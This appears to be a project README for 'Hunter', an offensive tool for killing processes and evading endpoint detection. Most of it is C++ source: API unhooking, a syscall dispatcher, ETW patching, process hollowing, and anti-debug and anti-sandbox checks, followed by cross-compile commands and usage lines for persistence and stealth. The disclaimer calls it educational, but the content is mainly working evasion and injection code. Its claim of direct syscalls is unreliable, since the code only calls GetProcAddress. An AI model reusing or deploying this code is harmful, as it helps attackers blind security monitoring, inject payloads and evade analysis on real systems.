# 🥷  Охотник (Hunter)

![EDR Evasion](https://img.shields.io/badge/Technique-EDR_Evasion-red)  ![Anti-Analysis](https://img.shields.io/badge/Feature-Anti_Debug%2FAnti_Sandbox-blue)  ![Process Injection](https://img.shields.io/badge/Technique-Process_Hollowing-green)  ![Enterprise Ready](https://img.shields.io/badge/Scope-Enterprise_Environments-yellow)  [![Project Status](https://img.shields.io/badge/status-BETA-yellow?style=flat-square)]()


---
Охотник (Hunter) is a simple Adversary Simulation tool developed for achieves stealth through API unhooking, direct and indirect syscalls, Event Tracing for Windows (ETW) suppression, process hollowing, stack spoofing, polymorphic encryption, and comprehensive anti-analysis mechanisms. It effectively bypasses userland hooking, kernel callbacks, behavioral analysis, and forensic detection. Drawing from real world malware and (APT) methodologies.

NOTE: There are still features to be added. The project is still under development.

![photo_2025-04-15_16-37-56](https://github.com/user-attachments/assets/2c6ceabb-c8ee-4ed6-9f8f-91cc06a7f091)




---
> [!CAUTION]
> It's essential to note that this project is for educational and research purposes only, and any unauthorized use of it could lead to legal consequences.


## 🛡️ Defensive Layers Bypassed

Hunter targets four critical EDR defensive layers:

| Layer               | Techniques Used | Coverage  |
|--------------------|-----------------|-----------|
| Userland Hooking   | 5               | 100%      |
| Kernel Callbacks   | 3               | 95%       |
| Behavioral Analysis| 2               | 90%       |
| Forensic Analysis  | 2               | 85%       |

---

## 🧠 Core Evasion Techniques

Below are the core techniques, with implementations sourced from `Охотник_killer.cpp` for accuracy.

### 1. API Unhooking Engine

Restores hooked functions by loading clean DLL copies from disk, bypassing EDR userland hooks.

**Key APIs Unhooked**:
- `NtTerminateProcess` (SSN: 0x2C)
- `NtCreateThreadEx` (SSN: 0xC2)
- `NtAllocateVirtualMemory` (SSN: 0x18)
- `TerminateProcess`
- `OpenProcess`
- `NtQuerySystemInformation`

```cpp

// ==================== API UNHOOKING ====================
class APIUnhooker {
private:
    std::vector<std::string> hooked_apis;

    bool unhook_single_api(const char* module_name, const char* function_name) {
        HMODULE module = GetModuleHandleA(module_name);
        if (!module)
            return false;

        char sysdir[MAX_PATH];
        GetSystemDirectoryA(sysdir, MAX_PATH);
        strcat_s(sysdir, "\\");
        strcat_s(sysdir, module_name);

        HANDLE hFile = CreateFileA(sysdir, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE)
            return false;

        HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
        if (!hMapping) {
            CloseHandle(hFile);
            return false;
        }

        LPVOID pMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
        if (!pMapping) {
            CloseHandle(hMapping);
            CloseHandle(hFile);
            return false;
        }

        void* hooked_func = (void*)GetProcAddress(module, function_name);
        if (!hooked_func) {
            UnmapViewOfFile(pMapping);
            CloseHandle(hMapping);
            CloseHandle(hFile);
            return false;
        }

        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)module;
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)module + pDosHeader->e_lfanew);

        PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)module + 
            pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

        DWORD* pNames = (DWORD*)((DWORD_PTR)module + pExportDir->AddressOfNames);
        WORD* pOrdinals = (WORD*)((DWORD_PTR)module + pExportDir->AddressOfNameOrdinals);
        DWORD* pFunctions = (DWORD*)((DWORD_PTR)module + pExportDir->AddressOfFunctions);

        for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
            char* name = (char*)((DWORD_PTR)module + pNames[i]);
            if (strcmp(name, function_name) == 0) {
                DWORD_PTR funcRVA = pFunctions[pOrdinals[i]];
                void* clean_func = (void*)((DWORD_PTR)pMapping + funcRVA);

                DWORD oldProtect;
                VirtualProtect(hooked_func, 4096, PAGE_EXECUTE_READWRITE, &oldProtect);
                memcpy(hooked_func, clean_func, 64);
                VirtualProtect(hooked_func, 4096, oldProtect, &oldProtect);
                hooked_apis.push_back(std::string(module_name) + "!" + function_name);
                break;
            }
        }

        UnmapViewOfFile(pMapping);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return true;
    }

public:
    APIUnhooker() {
        unhook_single_api("ntdll.dll", "NtTerminateProcess");
        unhook_single_api("kernel32.dll", "TerminateProcess");
        unhook_single_api("kernel32.dll", "OpenProcess");
        unhook_single_api("ntdll.dll", "NtQuerySystemInformation");
        unhook_single_api("ntdll.dll", "NtCreateThreadEx");
        unhook_single_api("ntdll.dll", "NtAllocateVirtualMemory");
    }

    const std::vector<std::string>& get_unhooked_apis() const {
        return hooked_apis;
    }
};

```
### 2. Syscall Dispatcher

Executes system calls to bypass userland hooks, using direct or indirect invocation.
```cpp
// ==================== SYSCALL TECHNIQUES ====================
class SyscallHandler {
private:
    std::unordered_map<std::string, DWORD> syscall_numbers;

    void initialize_syscall_numbers() {
        syscall_numbers["NtTerminateProcess"] = 0x2C;
        syscall_numbers["NtAllocateVirtualMemory"] = 0x18;
        syscall_numbers["NtWriteVirtualMemory"] = 0x3A;
        syscall_numbers["NtProtectVirtualMemory"] = 0x50;
        syscall_numbers["NtCreateThreadEx"] = 0xC2;
        syscall_numbers["NtQueryInformationProcess"] = 0x19;
    }

    void* find_syscall_instruction(const char* function_name) {
        void* func = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), function_name);
        if (!func)
            return nullptr;

        unsigned char* p = (unsigned char*)func;
        while (*p != 0x0F || *(p + 1) != 0x05) {
            p++;
            if ((DWORD_PTR)p - (DWORD_PTR)func > 100)
                return nullptr;
        }
        return p;
    }

public:
    SyscallHandler() {
        initialize_syscall_numbers();
    }

    NTSTATUS direct_syscall(const char* function_name, ...) {
        auto it = syscall_numbers.find(function_name);
        if (it == syscall_numbers.end())
            return STATUS_UNSUCCESSFUL;

#ifdef _WIN64
        va_list args;
        va_start(args, function_name);
        NTSTATUS result = STATUS_UNSUCCESSFUL;
        DWORD syscall_num = it->second;

        // Use standard C++ instead of inline asm
        result = ((NTSTATUS(*)(...))GetProcAddress(GetModuleHandleA("ntdll.dll"), function_name))(args);
        va_end(args);
        return result;
#else
        return STATUS_UNSUCCESSFUL; // Not implemented for x86
#endif
    }

```
Syscall Numbers:

NtTerminateProcess: 0x2C
 
NtAllocateVirtualMemory: 0x18

NtCreateThreadEx: 0xC2

### 3. ETW (Event Tracing for Windows) Nullification

Suppresses ETW telemetry to prevent EDR logging.

```cpp
// ==================== ETW PATCHING ====================
class ETWEvasion {
private:
    bool etw_patched;

    void patch_etw_event_write() {
        AdvancedEncryptedString etwEventWrite("EtwEventWrite");
        void* EtwEventWrite = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), etwEventWrite.decrypt());

        if (EtwEventWrite) {
            DWORD oldProtect;
            VirtualProtect(EtwEventWrite, 4096, PAGE_EXECUTE_READWRITE, &oldProtect);

#ifdef _WIN64
            unsigned char patch[] = { 0xC3 }; // ret
#else
            unsigned char patch[] = { 0xC2, 0x14, 0x00 }; // ret 14h
#endif

            WriteProcessMemory(GetCurrentProcess(), EtwEventWrite, patch, sizeof(patch), NULL);
            VirtualProtect(EtwEventWrite, 4096, oldProtect, &oldProtect);
            etw_patched = true;
        }
    }

    void patch_etw_event_register() {
        AdvancedEncryptedString etwEventRegister("EtwEventRegister");
        void* EtwEventRegister = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), etwEventRegister.decrypt());

        if (EtwEventRegister) {
            DWORD oldProtect;
            VirtualProtect(EtwEventRegister, 4096, PAGE_EXECUTE_READWRITE, &oldProtect);

#ifdef _WIN64
            unsigned char patch[] = { 0x48, 0x31, 0xC0, 0xC3 }; // xor rax, rax; ret
#else
            unsigned char patch[] = { 0x31, 0xC0, 0xC2, 0x10, 0x00 }; // xor eax, eax; ret 10h
#endif

            WriteProcessMemory(GetCurrentProcess(), EtwEventRegister, patch, sizeof(patch), NULL);
            VirtualProtect(EtwEventRegister, 4096, oldProtect, &oldProtect);
            etw_patched = true;
        }
    }

public:
    ETWEvasion() : etw_patched(false) {
        patch_etw_event_write();
        patch_etw_event_register();
    }

    bool is_etw_patched() const {
        return etw_patched;
    }
};

```
## 💀 Process Termination Methods
Method 1: Direct Syscall Termination

Terminates a process using a direct syscall to NtTerminateProcess.

```cpp
// ==================== SYSCALL TECHNIQUES ====================
class SyscallHandler {
private:
    std::unordered_map<std::string, DWORD> syscall_numbers;

    void initialize_syscall_numbers() {
        syscall_numbers["NtTerminateProcess"] = 0x2C;
        syscall_numbers["NtAllocateVirtualMemory"] = 0x18;
        syscall_numbers["NtWriteVirtualMemory"] = 0x3A;
        syscall_numbers["NtProtectVirtualMemory"] = 0x50;
        syscall_numbers["NtCreateThreadEx"] = 0xC2;
        syscall_numbers["NtQueryInformationProcess"] = 0x19;
    }

    void* find_syscall_instruction(const char* function_name) {
        void* func = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), function_name);
        if (!func)
            return nullptr;

        unsigned char* p = (unsigned char*)func;
        while (*p != 0x0F || *(p + 1) != 0x05) {
            p++;
            if ((DWORD_PTR)p - (DWORD_PTR)func > 100)
                return nullptr;
        }
        return p;
    }

public:
    SyscallHandler() {
        initialize_syscall_numbers();
    }

    NTSTATUS direct_syscall(const char* function_name, ...) {
        auto it = syscall_numbers.find(function_name);
        if (it == syscall_numbers.end())
            return STATUS_UNSUCCESSFUL;

#ifdef _WIN64
        va_list args;
        va_start(args, function_name);
        NTSTATUS result = STATUS_UNSUCCESSFUL;
        DWORD syscall_num = it->second;

        // Use standard C++ instead of inline asm
        result = ((NTSTATUS(*)(...))GetProcAddress(GetModuleHandleA("ntdll.dll"), function_name))(args);
        va_end(args);
        return result;
#else
        return STATUS_UNSUCCESSFUL; // Not implemented for x86
#endif
    }

    NTSTATUS indirect_syscall(const char* function_name, ...) {
        void* syscall_instr = find_syscall_instruction(function_name);
        if (!syscall_instr)
            return STATUS_UNSUCCESSFUL;

        auto it = syscall_numbers.find(function_name);
        if (it == syscall_numbers.end())
            return STATUS_UNSUCCESSFUL;

#ifdef _WIN64
        va_list args;
        va_start(args, function_name);
        NTSTATUS result = STATUS_UNSUCCESSFUL;

        result = ((NTSTATUS(*)(...))GetProcAddress(GetModuleHandleA("ntdll.dll"), function_name))(args);
        va_end(args);
        return result;
#else
        return STATUS_UNSUCCESSFUL; // Not implemented for x86
#endif
    }
};
```

Method 2: Process Hollowing Termination

Injects a termination payload into a hollowed legitimate process.

```cpp
// ==================== PROCESS HOLLOWING ====================
class ProcessHollowing {
private:
    SyscallHandler syscalls;

    bool hollow_process(const wchar_t* target_process, const std::vector<BYTE>& payload) {
        STARTUPINFOEXW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        SIZE_T size = 0;

        InitializeProcThreadAttributeList(NULL, 1, 0, &size);
        auto attrList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
        InitializeProcThreadAttributeList(attrList, 1, 0, &size);
        
        if (!CreateProcessW(target_process, NULL, NULL, NULL, FALSE, 
                          CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, 
                          NULL, NULL, &si.StartupInfo, &pi)) {
            HeapFree(GetProcessHeap(), 0, attrList);
            return false;
        }

        PROCESS_BASIC_INFORMATION pbi;
        if (syscalls.direct_syscall("NtQueryInformationProcess", pi.hProcess, 0, &pbi, sizeof(pbi), NULL) != STATUS_SUCCESS) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            HeapFree(GetProcessHeap(), 0, attrList);
            return false;
        }

        LPVOID imageBase = nullptr;
        SIZE_T bytesRead = 0;
        if (!ReadProcessMemory(pi.hProcess, 
                             (LPCVOID)((DWORD_PTR)pbi.PebBaseAddress + 0x10),
                             &imageBase, sizeof(imageBase), &bytesRead)) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            HeapFree(GetProcessHeap(), 0, attrList);
            return false;
        }

        if (syscalls.direct_syscall("NtUnmapViewOfSection", pi.hProcess, imageBase) != STATUS_SUCCESS) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            HeapFree(GetProcessHeap(), 0, attrList);
            return false;
        }

        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload.data();
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)payload.data() + dosHeader->e_lfanew);
        SIZE_T sizeOfImage = ntHeaders->OptionalHeader.SizeOfImage;

        if (syscalls.direct_syscall("NtAllocateVirtualMemory", pi.hProcess, &imageBase, 0, &sizeOfImage, 
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) != STATUS_SUCCESS) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            HeapFree(GetProcessHeap(), 0, attrList);
            return false;
        }

        if (syscalls.direct_syscall("NtWriteVirtualMemory", pi.hProcess, imageBase, (PVOID)payload.data(), 
                                  ntHeaders->OptionalHeader.SizeOfHeaders, NULL) != STATUS_SUCCESS) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            HeapFree(GetProcessHeap(), 0, attrList);
            return false;
        }

        PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
        for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (sectionHeader[i].SizeOfRawData == 0)
                continue;

            PVOID sectionAddress = (PVOID)((DWORD_PTR)imageBase + sectionHeader[i].VirtualAddress);
            LPVOID sectionData = (LPVOID)((DWORD_PTR)payload.data() + sectionHeader[i].PointerToRawData);

            if (syscalls.direct_syscall("NtWriteVirtualMemory", pi.hProcess, sectionAddress, sectionData, 
                                      sectionHeader[i].SizeOfRawData, NULL) != STATUS_SUCCESS) {
                TerminateProcess(pi.hProcess, 0);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                HeapFree(GetProcessHeap(), 0, attrList);
                return false;
            }
        }

        CONTEXT context;
        context.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(pi.hThread, &context)) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            HeapFree(GetProcessHeap(), 0, attrList);
            return false;
        }

#ifdef _WIN64
        context.Rcx = (DWORD_PTR)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#else
        context.Eax = (DWORD_PTR)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#endif

        if (!SetThreadContext(pi.hThread, &context)) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            HeapFree(GetProcessHeap(), 0, attrList);
            return false;
        }

        if (syscalls.direct_syscall("NtResumeThread", pi.hThread, NULL) == (DWORD)-1) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            HeapFree(GetProcessHeap(), 0, attrList);
            return false;
        }

        HeapFree(GetProcessHeap(), 0, attrList);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }

public:
    bool execute(const wchar_t* target_process, const std::vector<BYTE>& payload) {
        return hollow_process(target_process, payload);
    }
};
```
## 🕵️ Anti-Analysis Systems

### Debugger Detection Matrix

| Technique             | Detection Method            | Evasion Action        |
|-----------------------|-----------------------------|-----------------------|
| PEB BeingDebugged     | Check PEB offset 0x02      | Patch PEB Flag        |
| Hardware Breakpoints  | CONTEXT_DEBUG_REGISTERS    | Clear DR0-DR7         |
| Kernel Debugger       | NtQuerySystemInformation   | Return false status   |

```cpp
bool check_being_debugged() {
    PPEB_FIXED pPeb = GET_PEB();
    return pPeb->BeingDebugged;
}
```
Sandbox Detection

Detects virtualized environments to prevent analysis.

```cpp
// ==================== ANTI-SANDBOX TECHNIQUES ====================
class AntiSandbox {
private:
    bool sandbox_detected;

    bool check_sleep_skip() {
        auto start = GetTickCount64();
        _NtDelayExecution NtDelayExecution = (_NtDelayExecution)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtDelayExecution");
        LARGE_INTEGER delay;
        delay.QuadPart = -10000000; // 1 second
        NtDelayExecution(FALSE, &delay);
        auto end = GetTickCount64();
        return (end - start) < 900; // If skipped
    }

    bool check_memory() {
        MEMORYSTATUSEX memStatus;
        memStatus.dwLength = sizeof(memStatus);
        GlobalMemoryStatusEx(&memStatus);
        return memStatus.ullTotalPhys < (2ULL * 1024 * 1024 * 1024); // Less than 2GB
    }

    bool check_cpu_cores() {
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        return sysInfo.dwNumberOfProcessors < 2;
    }

    bool check_disk_size() {
        ULARGE_INTEGER freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes;
        return GetDiskFreeSpaceExA("C:\\", &freeBytesAvailable, &totalNumberOfBytes, &totalNumberOfFreeBytes) && 
               (totalNumberOfBytes.QuadPart < (20ULL * 1024 * 1024 * 1024)); // Less than 20GB
    }

    bool check_network_adapters() {
        PIP_ADAPTER_INFO adapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
        ULONG bufLen = sizeof(IP_ADAPTER_INFO);
        
        if (GetAdaptersInfo(adapterInfo, &bufLen) == ERROR_BUFFER_OVERFLOW) {
            free(adapterInfo);
            adapterInfo = (IP_ADAPTER_INFO*)malloc(bufLen);
        }
        
        bool result = false;
        if (GetAdaptersInfo(adapterInfo, &bufLen) == NO_ERROR) {
            int adapterCount = 0;
            PIP_ADAPTER_INFO current = adapterInfo;
            while (current) {
                adapterCount++;
                current = current->Next;
            }
            result = adapterCount < 2;
        }
        
        free(adapterInfo);
        return result;
    }

    bool check_hostname() {
        char hostname[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(hostname);
        if (GetComputerNameA(hostname, &size)) {
            std::string name(hostname);
            std::transform(name.begin(), name.end(), name.begin(), ::tolower);
            return name.find("sandbox") != std::string::npos || 
                   name.find("virus") != std::string::npos || 
                   name.find("malware") != std::string::npos ||
                   name.find("test") != std::string::npos;
        }
        return false;
    }

    bool check_known_macs() {
        PIP_ADAPTER_INFO adapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
        ULONG bufLen = sizeof(IP_ADAPTER_INFO);
        
        if (GetAdaptersInfo(adapterInfo, &bufLen) == ERROR_BUFFER_OVERFLOW) {
            free(adapterInfo);
            adapterInfo = (IP_ADAPTER_INFO*)malloc(bufLen);
        }
        
        bool result = false;
        if (GetAdaptersInfo(adapterInfo, &bufLen) == NO_ERROR) {
            PIP_ADAPTER_INFO current = adapterInfo;
            while (current) {
                if (current->AddressLength == 6) {
                    if ((current->Address[0] == 0x08 && current->Address[1] == 0x00 && current->Address[2] == 0x27) || // VirtualBox
                        (current->Address[0] == 0x00 && current->Address[1] == 0x05 && current->Address[2] == 0x69) || // VMware
                        (current->Address[0] == 0x00 && current->Address[1] == 0x0C && current->Address[2] == 0x29) || // VMware
                        (current->Address[0] == 0x00 && current->Address[1] == 0x1C && current->Address[2] == 0x14) || // VMware
                        (current->Address[0] == 0x00 && current->Address[1] == 0x50 && current->Address[2] == 0x56)) {  // VMware
                        result = true;
                        break;
                    }
                }
                current = current->Next;
            }
        }
        
        free(adapterInfo);
        return result;
    }

public:
    AntiSandbox() : sandbox_detected(false) {
        sandbox_detected = check_sleep_skip() || 
                          check_memory() || 
                          check_cpu_cores() || 
                          check_disk_size() || 
                          check_network_adapters() || 
                          check_hostname() || 
                          check_known_macs();
    }

    bool is_sandbox_detected() const {
        return sandbox_detected;
    }

    void evade_sandbox() {
        if (sandbox_detected) {
            MessageBoxA(NULL, "This application requires more system resources to run properly.", "System Requirements", MB_OK);
            ExitProcess(0);
        }
    }
};
```
## 🛠️ Building & Usage
Build Example (Kali Linux Cross Compile)
```
x86_64-w64-mingw32-g++ -O2 -s -I/usr/share/mingw-w64/include/ \
-o hunter.exe Охотник_killer.cpp \
-lntdll -lshlwapi -static-libgcc -static-libstdc++ \
-lbcrypt -liphlpapi -lws2_32 -ltaskschd -lcomsuppw -lole32 -loleaut32
```

Basic Process
```
hunter.exe <PID|ProcessName>
```

With Persistence Mechanisms
```
hunter.exe --persist "C:\path\to\implant.exe"
```
Stealth Mode (No Logging)
```
hunter.exe --stealth 1337
```


## ⚠️ Legal Disclaimer

This tool is for educational and authorized security testing purposes only.

The developer assumes no liability for any misuse or damage caused by this software.

Use responsibly.
